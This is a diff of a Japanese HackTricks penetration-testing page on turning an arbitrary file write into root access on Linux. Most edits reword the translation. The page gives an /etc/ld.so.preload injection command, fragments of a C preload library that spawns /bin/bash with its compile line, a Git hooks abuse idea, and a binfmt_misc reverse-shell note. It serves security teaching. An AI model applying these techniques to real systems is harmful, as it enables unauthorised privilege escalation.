@@ -1,26 +1,26 @@
 # ルートへの任意のファイル書き込み
 
 {% hint style="success" %}
-AWSハッキングの学習と練習:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングの学習と練習: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricksのサポート</summary>
+<summary>HackTricksをサポートする</summary>
 
-* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
-* ハッキングトリックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してハッキングトリックを共有してください。**
 
 </details>
 {% endhint %}
 
 ### /etc/ld.so.preload
 
-このファイルは**`LD_PRELOAD`**環境変数のように振る舞いますが、**SUIDバイナリ**でも機能します。\
-これを作成または変更できれば、実行されるバイナリごとに**ロードされるライブラリへのパス**を追加できます。
+このファイルは**`LD_PRELOAD`**環境変数のように動作しますが、**SUIDバイナリ**でも機能します。\
+これを作成または変更できる場合、実行される各バイナリと共に読み込まれる**ライブラリへのパスを追加する**ことができます。
 
-例: `echo "/tmp/pe.so" > /etc/ld.so.preload`
+例えば：`echo "/tmp/pe.so" > /etc/ld.so.preload`
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -35,11 +35,11 @@ system("/bin/bash");
 //cd /tmp
 //gcc -fPIC -shared -o pe.so pe.c -nostartfiles
 ```
-### Git フック
+### Git hooks
 
-[**Git フック**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)は、コミットが作成されたとき、マージが行われたときなど、git リポジトリでさまざまなイベントで実行される**スクリプト**です。したがって、特権のあるスクリプトまたはユーザーがこれらのアクションを頻繁に実行し、`.git` フォルダに**書き込む**ことが可能であれば、これを**特権昇格**に利用できます。
+[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) は、コミットが作成されるときやマージなど、git リポジトリ内のさまざまな **イベント** で **実行される** **スクリプト** です。したがって、**特権のあるスクリプトまたはユーザー** がこれらのアクションを頻繁に実行し、`.git` フォルダーに **書き込む** ことが可能であれば、これを **privesc** に利用できます。
 
-たとえば、新しいコミットが作成されるたびに常に実行されるように、git リポジトリ内の**`.git/hooks`**にスクリプトを**生成**することが可能です：
+たとえば、git リポジトリの **`.git/hooks`** に **スクリプトを生成** することが可能で、新しいコミットが作成されるたびに常に実行されます：
 
 {% code overflow="wrap" %}
 ```bash
@@ -58,19 +58,19 @@ TODO
 
 ### binfmt\_misc
 
-`/proc/sys/fs/binfmt_misc`にあるファイルは、どのバイナリがどの種類のファイルを実行するかを示しています。TODO: 一般的なファイルタイプが開かれたときに逆シェルを実行するためにこれを悪用する要件をチェックしてください。
+`/proc/sys/fs/binfmt_misc`にあるファイルは、どのバイナリがどのタイプのファイルを実行すべきかを示しています。TODO: 一般的なファイルタイプが開かれたときにリバースシェルを実行するためにこれを悪用する要件を確認してください。
 
 {% hint style="success" %}
-AWSハッキングの学習と実践:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングの学習と実践: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、実践する:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricksのサポート</summary>
+<summary>HackTricksをサポートする</summary>
 
-* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
-* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローしてください。
-* **HackTricks**と**HackTricks Cloud**のgithubリポジトリにPRを提出して、ハッキングトリックを共有してください。
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
 </details>
 {% endhint %}
